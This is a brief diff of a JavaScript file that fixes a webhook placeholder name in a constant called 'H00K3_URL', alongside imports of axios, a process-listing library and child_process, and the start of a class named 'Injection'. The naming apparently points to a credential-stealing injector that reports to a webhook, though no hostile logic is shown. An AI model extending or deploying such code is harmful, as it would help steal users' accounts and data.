@@ -5,7 +5,7 @@ const axios = require('axios');
 const psList = require('ps-list');
 const { execFile } = require('child_process');
 
-const H00K3_URL = "%WEBHOOKE%";
+const H00K3_URL = "%WEBHOOK%";
 
 class Injection {
   constructor(webhook) {
